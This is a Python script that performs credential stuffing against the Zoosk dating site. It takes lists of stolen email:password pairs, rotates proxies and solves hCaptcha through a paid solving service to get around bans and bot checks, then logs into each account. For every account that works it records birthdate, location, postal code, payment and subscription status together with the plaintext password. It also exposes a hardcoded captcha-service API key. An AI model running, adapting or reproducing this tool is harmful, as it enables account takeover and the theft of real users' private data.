from itertools import cycle
import random
import sys
from colorama import init, Fore, Style
from threading import Lock
from concurrent.futures import ThreadPoolExecutor
from twocaptcha import TwoCaptcha
import httpx
import datetime
from fake_headers import Headers

TWOCAPTCHA_API_KEY = '33a1c886c37c666b6cbfd5e8b7cbdd19'


def login(username, password):
    print("STARTING")

    proxy_login = 'system'
    proxy_pass = '1234567'
    global proxy_pool
    prx = next(proxy_pool)
    proxy = {'http://': f'http://{proxy_login}:{proxy_pass}@{prx}',
             'https://': f'http://{proxy_login}:{proxy_pass}@{prx}'}
    # proxy = {'http://': f'http://{prx}', 'https://': f'http://{prx}'}
    try:
        token = TwoCaptcha(TWOCAPTCHA_API_KEY).hcaptcha(
            sitekey='41092c54-1ee4-42eb-9bcc-a31d3a665dbd', url='https://www.zoosk.com/login/email')['code']
    except Exception:
        print('Invalid 2captcha API key!')
        exit(-1)
    data = {
        "login": username,
        "password": password,
        'pong_light': '1',
        # 'blackbox': '',
        'hCaptcha_Token': token
    }
    headers = {
        'authority': 'www.zoosk.com',
        'pragma': 'no-cache',
        'cache-control': 'no-cache',
        'sec-ch-ua': '"Chromium";v="92", " Not A;Brand";v="99", "Google Chrome";v="92"',
        'accept': 'application/json, text/plain, */*',
        'x-zoosk-csrf': 'zoosk-csrf-2019',
        'sec-ch-ua-mobile': '?0',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36',
        'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
        'origin': 'https://www.zoosk.com',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-mode': 'cors',
        'sec-fetch-dest': 'empty',
        'referer': 'https://www.zoosk.com/',
        'accept-language': 'en-US,en;q=0.9,fr-FR;q=0.8,fr;q=0.7',
    }
    global good_emails, checked_emails, proxy_bans
    headers = Headers(os='win', browser='firefox', headers=True).generate()
    headers['x-zoosk-csrf'] = 'zoosk-csrf-2019'
    headers['Accept-Encoding'] = 'gzip, deflate'
    session = httpx.Client(proxies=proxy)
    try:
        session.get('https://www.zoosk.com/')
        response = session.post(
            'https://www.zoosk.com/v4.0/login/general_v42.php?format=json&product=1&locale=en_US', data=data, headers=headers, timeout=15)
        print(response.text)
    except:
        print("{}Bad proxy {}{}".format(Fore.BLUE, prx, Style.RESET_ALL))
        return False
    if response.status_code != 200:
        proxy_bans += 1
        print('{}Proxy {} is banned{}'.format(Fore.RED, prx, Style.RESET_ALL))
        return False
    else:
        try:
            json_data = response.json(
            )['response']['data']['pong']['user_status']
            coins = json_data['coin_count']
            subscribed = json_data['is_subscriber']
            if subscribed:
                subscribed = 'Paid'
            else:
                subscribed = 'UnPaid'
            data = {
                'requestedPath': '/personals/datecard/me'
            }
            try:
                response = session.post(
                    'https://www.zoosk.com/bootstrap/personals', data=data, timeout=15)
            except Exception:
                print("{}Bad proxy {}{}".format(
                    Fore.BLUE, prx, Style.RESET_ALL))
                return False
            payment_account = "NO"
            try:
                payment_account = response.json(
                )['subscriptionStatus']['response']['data']['user_subscription']['payment_type']
                payment_account = 'Yes'
            except:
                pass
            try:
                json_data = response.json()['user']['response']['data']['user']
            except Exception as e:
                checked_emails += 1
                print("{}Verification needed for login {}:{}{}".format(
                    Fore.YELLOW, username, password, Style.RESET_ALL))
                return True
            basic = json_data['basic_info']
            gender = basic['sex']
            if gender == 'm':
                gender = 'Male'
            elif gender == 'f':
                gender = 'Female'
            age = basic['age']
            photo = basic['photos']['count']
            if photo == 0:
                photo = 'NO'
            else:
                photo = 'YES'
            location_data = basic['location']
            city = location_data['city']['cdata']
            state = location_data['state']['abbrev']
            country = location_data['country']['iso']
            postal_code = location_data['postal_code']['cdata']
            birthdate = json_data['private_info']['birth_time']
            # birthdate = time.strftime('%d/%m/%Y', time.localtime(birthdate))
            # Workaround for negative timestamp on Windows
            birthdate = datetime.datetime(
                1970, 1, 1) + datetime.timedelta(seconds=birthdate)
            birthdate = birthdate.strftime('%d/%m/%Y')
            line_write = "Zoosk({}) | {} | {},Photo:{},Age:{},DOB:{},Coins:{},Location:{}, {}, {} | www.zoosk.com | {} | {} | Payment: {}".format(
                subscribed, country, gender, photo, age, birthdate, coins, city, state, postal_code, username, password,
                payment_account)
            lock_file.acquire()
            fil = open('successful_accounts.txt', 'a+')
            fil.write(line_write + '\n')
            fil.close()
            lock_file.release()
            good_emails += 1
            checked_emails += 1
            print("{}Login {}:{} is successful{}".format(
                Fore.GREEN, username, password, Style.RESET_ALL))
        except Exception as e:
            checked_emails += 1
            print("{}Login {}:{} is wrong{}".format(
                Fore.YELLOW, username, password, Style.RESET_ALL))
    return True


def init_login(acc):
    success = False
    try:
        user, pwd = acc.split(':')
    except:
        print('{}Format of {} is incorrect{}'.format(
            Fore.CYAN, acc, Style.RESET_ALL))
        success = True
    while not success:
        success = login(user, pwd)
        update_report()


def update_report():
    report_file_lock.acquire()
    report_file.truncate(0)
    report_file.seek(0)
    report_file.write(
        f'Checked: {checked_emails} | Suceed: {good_emails} | Banned: {proxy_bans}')
    report_file.flush()
    report_file_lock.release()


with open('accs.txt', 'r') as f:
    accs = f.readlines()
    print(accs)

checked_emails = 0
good_emails = 0
proxy_bans = 0
report_file = open('Raporti.txt', 'w')
report_file_lock = Lock()
init()
with open('accs.txt', 'r') as f:
    accounts = f.readlines()

list_proxies = []
try:
    file = open('Proxy.txt', 'r')
except:
    print(Fore.RED, "Proxy.txt file is not available on the same directory.", Style.RESET_ALL)
    exit(-66)
list_proxies = file.read().splitlines()
file.close()
random.shuffle(list_proxies)
proxy_pool = cycle(list_proxies)
lock_file = Lock()
with ThreadPoolExecutor(max_workers=5) as executor:
    executor.map(init_login, accounts)
